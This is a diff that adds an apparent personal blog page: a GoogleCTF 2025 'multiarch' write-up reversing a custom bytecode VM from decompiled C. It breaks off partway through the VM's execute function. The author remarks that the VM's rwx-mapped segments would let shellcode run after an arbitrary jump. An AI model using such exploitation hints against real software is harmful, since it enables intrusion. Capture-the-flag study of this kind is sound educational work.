@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 17.5px;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>GoogleCTF 2025 | multiarch</title>
+    <meta name="description" content="Overview This weekend, I played GoogleCTF to try out some of the challenges, since this CTF is highly rated on CTFTime. The first challenges I solved were …">
+    <meta name="keywords" content='pwn, rev, writeup, vm'>
+
+    <meta property="og:url" content="https://m4nj4r0.github.io/blog/posts/googlectf-2025--multiarch/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="GoogleCTF 2025 | multiarch">
+    <meta property="og:description" content="Overview This weekend, I played GoogleCTF to try out some of the challenges, since this CTF is highly rated on CTFTime. The first challenges I solved were …">
+    <meta property="og:image" content="https://m4nj4r0.github.io/blog/images/avatar.png">
+    <meta property="og:image:secure_url" content="https://m4nj4r0.github.io/blog/images/avatar.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="GoogleCTF 2025 | multiarch">
+    <meta name="twitter:description" content="Overview This weekend, I played GoogleCTF to try out some of the challenges, since this CTF is highly rated on CTFTime. The first challenges I solved were …">
+    <meta property="twitter:domain" content="https://m4nj4r0.github.io/blog/posts/googlectf-2025--multiarch/">
+    <meta property="twitter:url" content="https://m4nj4r0.github.io/blog/posts/googlectf-2025--multiarch/">
+    <meta name="twitter:image" content="https://m4nj4r0.github.io/blog/images/avatar.png">
+
+    
+    <link rel="canonical" href="https://m4nj4r0.github.io/blog/posts/googlectf-2025--multiarch/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/blog/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/blog/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/blog/css/dark.min.css">
+
+    
+    <script src="/blog/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+
+    
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://m4nj4r0.github.io/blog/">
+                <img src='/blog/images/avatar.png' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://m4nj4r0.github.io/blog/">Manjaro</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://m4nj4r0.github.io/blog/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://m4nj4r0.github.io/blog/tags/" aria-label="" > Tags </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://m4nj4r0.github.io/blog/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://m4nj4r0.github.io/blog/tags/" > Tags </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>GoogleCTF 2025 | multiarch</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              June 29, 2025
+
+              
+                  | Updated June 30, 2025
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+           
+             <li class="post-tag"><a href="https://m4nj4r0.github.io/blog/tags/pwn">pwn</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://m4nj4r0.github.io/blog/tags/rev">rev</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://m4nj4r0.github.io/blog/tags/writeup">writeup</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://m4nj4r0.github.io/blog/tags/vm">vm</a></li>
+           
+         
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <h2 id="overview">Overview</h2>
+<p>This weekend, I played GoogleCTF to try out some of the challenges, since this CTF is highly rated on CTFTime.
+The first challenges I solved were multiarch part 1 &amp; 2, which I found to be the most interesting,
+even though they were relatively easy compared to the rest of the CTF.</p>
+<p>First part was a reverse engineering challenge, which isn’t my main category, but I do it because binary exploitation
+usually requires some reversing in almost every challenge. This time, it was impossible for me to do the binary exploitation part without
+reversing it first. The binary was a &ldquo;virtual machine&rdquo;-type challenge — an interpreter for custom bytecode provided with the challenge
+in a file called <code>crackme.masm</code>.</p>
+<h2 id="reversing-virtual-machine">Reversing Virtual Machine</h2>
+<p>The <code>main</code> function was just a series of calls to other functions for loading the file, VM initialization, execution, and destruction.
+I created a structure for the VM and its segments based on the other functions to make reversing it easier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> size;
+</span></span><span style="display:flex;"><span>} Seg;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">__attribute__</span>((packed))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> type;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> offset;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> size;
+</span></span><span style="display:flex;"><span>} SegInfo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    Seg seg1;
+</span></span><span style="display:flex;"><span>    Seg seg2;
+</span></span><span style="display:flex;"><span>    Seg seg3;
+</span></span><span style="display:flex;"><span>} VMSegs;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">__attribute__</span>((packed)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> vaddr;
+</span></span><span style="display:flex;"><span>} MemSeg;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">__attribute__</span>((packed)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>code;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>stack;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>bitmask;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>getflag)();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> err_flag, mode_flag, FLAGS;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> PC, SP, RA, RB, RC, RD;
+</span></span><span style="display:flex;"><span>    MemSeg add_mems[<span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> mems_cnt;
+</span></span><span style="display:flex;"><span>} VM;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    VMSegs <span style="color:#f92672">*</span>vmsegs; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VMSegs <span style="color:#f92672">*</span>vmsegs_; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VM <span style="color:#f92672">*</span>vm; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdin, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stderr, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[E] usage: %s [path to .masm file]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>argv);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[I] initializing multiarch emulator</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x24uLL</span>, stderr);
+</span></span><span style="display:flex;"><span>        vmsegs <span style="color:#f92672">=</span> <span style="color:#a6e22e">load_file</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        vmsegs_ <span style="color:#f92672">=</span> vmsegs;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( vmsegs )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            vm <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm_init</span>(vmsegs);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[I] executing program</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x16uLL</span>, stderr);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ( <span style="color:#a6e22e">vm_execute</span>(vm) )
+</span></span><span style="display:flex;"><span>                ;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( vm<span style="color:#f92672">-&gt;</span>err_flag )
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[E] execution failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x15uLL</span>, stderr);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">vm_error</span>(vm, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[I] done!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0xAuLL</span>, stderr);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">vm_destroy</span>(vm);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">clear_vmsegs</span>(vmsegs_);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[E] couldn&#39;t load multiarch program</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x24uLL</span>, stderr);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="file-structure-and-vm-initialization">File Structure and VM Initialization</h3>
+<p>In previous VM challenges I did, files contained just bytecode for the VM, but this time the file had some structure.
+It starts with a header check for the <code>MASM</code> string, followed by segment information. The <code>read_seg</code> function reads the structure for VM segment data
+from the file at the offset given as the second argument, and based on that data, it allocates memory for the segment and loads it in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>VMSegs <span style="color:#f92672">*</span> <span style="color:#a6e22e">load_file</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>fname)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>fptr; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    FILE <span style="color:#f92672">*</span>fptr_; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VMSegs <span style="color:#f92672">*</span>vmsegs; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>errno_ptr; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>errstr; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>errno_ptr_; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>errstr_; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> header[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-38h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint64_t</span> canary; <span style="color:#75715e">// [rsp+18h] [rbp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>    fptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(fname, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    fptr_ <span style="color:#f92672">=</span> fptr;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>fptr )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        errno_ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">__errno_location</span>();
+</span></span><span style="display:flex;"><span>        errstr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strerror</span>(<span style="color:#f92672">*</span>errno_ptr);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[E] couldn&#39;t open file %s - %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fname, errstr);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(header, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(header));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">fread</span>(header, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">4uLL</span>, fptr) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        errno_ptr_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">__errno_location</span>();
+</span></span><span style="display:flex;"><span>        errstr_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">strerror</span>(<span style="color:#f92672">*</span>errno_ptr_);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[E] couldn&#39;t read magic - %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, errstr_);
+</span></span><span style="display:flex;"><span>LABEL_9:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>(fptr_);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strncmp</span>(header, <span style="color:#e6db74">&#34;MASM&#34;</span>, <span style="color:#ae81ff">4uLL</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;[E] bad magic</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0xEuLL</span>, stderr);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_9;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    vmsegs <span style="color:#f92672">=</span> (VMSegs <span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x30uLL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">read_seg</span>(vmsegs, <span style="color:#ae81ff">4uLL</span>, fptr_) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">read_seg</span>(vmsegs, <span style="color:#ae81ff">9uLL</span>, fptr_) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">read_seg</span>(vmsegs, <span style="color:#ae81ff">14uLL</span>, fptr_) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( vmsegs )
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">clear_vmsegs</span>(vmsegs);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_9;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> vmsegs;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The VM is initialized based on the loaded segments, which represent <code>code</code>, <code>data</code>, <code>stack</code>, and <code>bitmask</code>.
+The bitmask segment is used to determine whether an instruction will be stack-based or register-based, since this VM has
+those two modes of executing instructions. A useful detail for the binary exploitation part that comes later is that
+<code>code</code> and <code>data</code> are loaded into mmap-ed memory with <strong>rwx</strong> permissions, so we can put shellcode there and,
+if we manage to get any arbitrary jump or call, we can execute it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>VM <span style="color:#f92672">*</span> <span style="color:#a6e22e">vm_init</span>(VMSegs <span style="color:#f92672">*</span>vmsegs)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    VM <span style="color:#f92672">*</span>vm; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>code; <span style="color:#75715e">// r14
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data; <span style="color:#75715e">// r13
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>bitmask; <span style="color:#75715e">// r12
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">size_t</span> size; <span style="color:#75715e">// r13
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    vm <span style="color:#f92672">=</span> (VM <span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x88uLL</span>);
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>code <span style="color:#f92672">=</span> code;
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">=</span> data;
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>stack <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>    bitmask <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1uLL</span>, vmsegs<span style="color:#f92672">-&gt;</span>seg3.size);
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>bitmask <span style="color:#f92672">=</span> bitmask;
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>getflag <span style="color:#f92672">=</span> getflag;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(code, vmsegs<span style="color:#f92672">-&gt;</span>seg1.data, vmsegs<span style="color:#f92672">-&gt;</span>seg1.size);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(data, vmsegs<span style="color:#f92672">-&gt;</span>seg2.data, vmsegs<span style="color:#f92672">-&gt;</span>seg2.size);
+</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> vmsegs<span style="color:#f92672">-&gt;</span>seg3.size;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(bitmask, vmsegs<span style="color:#f92672">-&gt;</span>seg3.data, vmsegs<span style="color:#f92672">-&gt;</span>seg3.size);
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>PC <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
+</span></span><span style="display:flex;"><span>    vm<span style="color:#f92672">-&gt;</span>SP <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8F00</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> vm;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="execution-and-virtual-address">Execution and &lsquo;virtual&rsquo; address</h3>
+<p>The VM executes instructions based on bits from the <code>bitmask</code> segment. In both types of instructions,
+there is a special instruction for system calls, used to execute functions like input, output, random, and similar operations.
+The <code>PRINT_FLAG</code> syscall is used to read the flag from the environment by calling <code>vm-&gt;getflag</code>, which points to the function responsible for that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">vm_get_pc_bit</span>(VM <span style="color:#f92672">*</span>vm)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> PC; <span style="color:#75715e">// edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> read_ind; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> byte; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    PC <span style="color:#f92672">=</span> vm<span style="color:#f92672">-&gt;</span>PC;
+</span></span><span style="display:flex;"><span>    read_ind <span style="color:#f92672">=</span> PC <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xFF9</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)(PC <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>        read_ind <span style="color:#f92672">=</span> vm<span style="color:#f92672">-&gt;</span>PC <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>;
+</span></span><span style="display:flex;"><span>    byte <span style="color:#f92672">=</span> vm<span style="color:#f92672">-&gt;</span>bitmask[read_ind <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_bittest</span>(<span style="color:#f92672">&amp;</span>byte, PC <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">7</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">vm_execute</span>(VM <span style="color:#f92672">*</span>vm)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> pc_bit; <span style="color:#75715e">// al
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    pc_bit <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm_get_pc_bit</span>(vm);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>pc_bit )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">vm_execute_stack</span>(vm);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( pc_bit )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">vm_execute_reg</span>(vm);
